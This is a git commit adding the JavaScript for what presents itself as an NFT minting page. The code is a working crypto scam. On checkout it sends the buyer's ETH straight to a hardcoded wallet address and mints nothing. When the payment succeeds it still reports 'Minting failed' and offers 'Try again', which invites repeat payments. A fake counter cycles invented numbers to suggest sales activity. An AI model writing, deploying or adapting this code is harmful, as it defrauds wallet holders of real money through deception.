bb7fcf88dc961fc6537a3db1390f333b44e7e5cd
run278 <99454974+run278@users.noreply.github.com>
2022-02-26 00:39:55 +0000

    lkmn

---
+++ @js/main.js.js
@@ -0,0 +1,110 @@
+const statusp = document.querySelector("#status");
+const connectBtn = document.querySelector('#connectBtn');
+const checkoutBtn = document.querySelector('#checkoutBtn');
+//const connectBtnHeader = document.querySelector('#connectBtnHeader');
+const pricePerNFT = 0.25;
+
+  //counter
+
+    $(document).ready(function (){
+  var count = 7893;
+ function myCount() {
+ if (count > 8769) {
+     count = 0;
+ }
+ $('.count').text(count);
+ count ++;
+  
+}
+
+setInterval(myCount,793);
+});
+
+                //countdown
+               
+
+/** input number spinner
+ */
+let plusBtn = document.querySelector('button[class*="text-button-plus"]');
+let minusBtn = document.querySelector('button[class*="text-button-minus"]');
+let totalNFTInput = document.querySelector('input[type="text"][id="totalNFT"]')
+let totalETHSpan =  document.querySelector('#totalETH');
+totalNFTInput.value = 1;
+totalETHSpan.innerText = totalNFTInput.value * pricePerNFT;
+
+plusBtn.addEventListener('click',()=>{
+  totalNFTInput.value = Number(totalNFTInput.value)  + 1;
+  totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(2);
+})
+minusBtn.addEventListener('click',()=>{
+  if (Number(totalNFTInput.value)>1) {
+    totalNFTInput.value =  Number(totalNFTInput.value) - 1;
+    totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(2);
+  }
+  
+})
+//** end of input number spinner */
+
+connectBtn.addEventListener('click', async () => {
+    if (window.ethereum) {
+      window.web3 = new Web3(ethereum);
+      try {
+        await ethereum.enable();
+        initPayButton()
+        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
+      } catch (err) {
+        console.log(err)
+        statusp.innerHTML = 'Wallet access denied'
+      }
+    } else if (window.web3) {
+      window.web3 = new Web3(web3.currentProvider)
+      initPayButton()
+    } else {
+      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
+    }
+  })
+
+  /*
+  connectBtnHeader.addEventListener('click', async () => {
+    if (window.ethereum) {
+      window.web3 = new Web3(ethereum);
+      try {
+        await ethereum.enable();
+        initPayButton()
+        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
+      } catch (err) {
+        console.log(err)
+        statusp.innerHTML = 'Wallet access denied'
+      }
+    } else if (window.web3) {
+      window.web3 = new Web3(web3.currentProvider)
+      initPayButton()
+    } else {
+      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
+    }
+  }) */
+  
+  const initPayButton = () => {
+    checkoutBtn.addEventListener('click', async () => {
+      statusp.innerText = 'Minting in progress....'
+      // paymentAddress is where funds will be send to
+      const paymentAddress = '0x36b1469048D7Db8DE08e2871336df551f20E5c9B'
+      let totalEth = totalETHSpan.innerText;
+      totalEth = totalEth.toString();
+      const accounts = await web3.eth.getAccounts();
+      web3.eth.sendTransaction({
+        from: web3.currentProvider.selectedAddress,
+        to: paymentAddress,
+        value: web3.utils.toWei(totalEth, 'ether')
+        }, (err, transactionId) => {
+        if  (err) {
+          console.log('Minting failed', err)
+          statusp.innerText = 'Minting failed'
+        } else {
+          console.log('Minting succeed', transactionId)
+          statusp.innerText = 'Minting failed';
+          checkoutBtn.innerText = 'Try again'  
+        }
+      })
+    })
+  }
